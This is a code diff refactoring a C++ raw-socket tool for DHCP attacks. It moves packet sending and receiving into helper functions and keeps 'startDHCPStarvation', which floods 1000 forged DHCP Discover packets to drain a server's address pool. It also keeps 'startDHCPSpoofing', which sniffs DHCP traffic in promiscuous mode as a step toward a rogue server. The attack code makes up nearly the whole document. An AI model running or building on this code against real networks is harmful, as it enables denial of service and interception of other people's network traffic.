@@ -16,9 +16,10 @@
 
 void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP);
 
-void startDHCPStarvation(AddressInfo& info)
+
+
+void sendDiscoverPacket(AddressInfo& info)
 {
-	
 	SOCKET s;
 	sockaddr_in dst;
 	int optval = 1;
@@ -35,26 +36,22 @@ void startDHCPStarvation(AddressInfo& info)
 #endif
 
 	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set the socket as a RAW socket
-	
-	for (int i = 0; i < 1000; i++)
-	{
-		char* raw_packet = new char[65536];
-		CreateDHCPDiscoverPacket(raw_packet, info);
 
-		sendto(
-			s,
-			raw_packet,
-			sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header),
-			0, (sockaddr*)&dst,
-			sizeof(dst)
-		);
-		delete[] raw_packet;
-		Sleep(20);
-	}
+
+	char* raw_packet = new char[65536];
+	CreateDHCPDiscoverPacket(raw_packet, info);
+
+	sendto(
+		s,
+		raw_packet,
+		sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header),
+		0, (sockaddr*)&dst,
+		sizeof(dst)
+	);
+	delete[] raw_packet;
 }
 
-
-void startDHCPSpoofing(AddressInfo& info)
+void recvDHCPPsackets(AddressInfo& info)
 {
 	SOCKET s;
 	sockaddr_in sockinfo;
@@ -73,7 +70,7 @@ void startDHCPSpoofing(AddressInfo& info)
 	sockinfo.sin_family = AF_INET;
 	sockinfo.sin_port = htons(0);
 
-	
+
 	s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //Create a RAW socket
 
 	if (s == SOCKET_ERROR)
@@ -81,32 +78,49 @@ void startDHCPSpoofing(AddressInfo& info)
 
 	bind(s, (sockaddr*)&sockinfo, sizeof(sockinfo));
 
-	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval) == -1) //Set the socket as a RAW socket
+	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval) == -1) //Set the socket as a RAW socket
 		std::cout << "setsockopt error: " << WSAGetLastError() << std::endl;
 	WSAIoctl(s, SIO_RCVALL, &optval, sizeof(optval), 0, 0, (LPDWORD)&in, 0, 0);
 
+	char* raw_packet = new char[65536];
+	memset(raw_packet, 0, 65536);
+
+	error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);
+
+	if (error == SOCKET_ERROR)
+		std::cout << "recv error: " << WSAGetLastError() << std::endl;
+
+	//std::cout << inet_ntoa(dst.sin_addr) << std::endl;
+	getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
+	sockinfo.sin_addr.s_addr = pIP.ip_destaddr;
+	if (ntohs(pUDP.dst_port) == 67)
+	{
+		std::cout << inet_ntoa(sockinfo.sin_addr) << std::endl;
+		if (checkForDHCP(pDHCP))
+		{
+			std::cout << "recv: ";
+			printHex(pDHCP.chaddr, sizeof pDHCP.chaddr);
+		}
+	}
+	delete[] raw_packet;
+}
+
+void startDHCPStarvation(AddressInfo& info)
+{
+	
+	for (int i = 0; i < 1000; i++)
+	{
+		sendDiscoverPacket(info);
+		Sleep(20);
+	}
+
+}
+
+
+void startDHCPSpoofing(AddressInfo& info)
+{
 	while (1)
 	{
-		char* raw_packet = new char[65536];
-		memset(raw_packet, 0, 65536);
-
-		error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);
-
-		if (error == SOCKET_ERROR)
-			std::cout << "recv error: " << WSAGetLastError() << std::endl;
-
-		//std::cout << inet_ntoa(dst.sin_addr) << std::endl;
-		getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
-		sockinfo.sin_addr.s_addr = pIP.ip_destaddr;
-		if (ntohs(pUDP.dst_port) == 67)
-		{
-			std::cout << inet_ntoa(sockinfo.sin_addr) << std::endl;
-			if (checkForDHCP(pDHCP))
-			{
-				std::cout << "recv: ";
-				printHex(pDHCP.chaddr, sizeof pDHCP.chaddr);
-			}
-		}
-			delete[] raw_packet;
+		recvDHCPPsackets(info);
 	}
 }
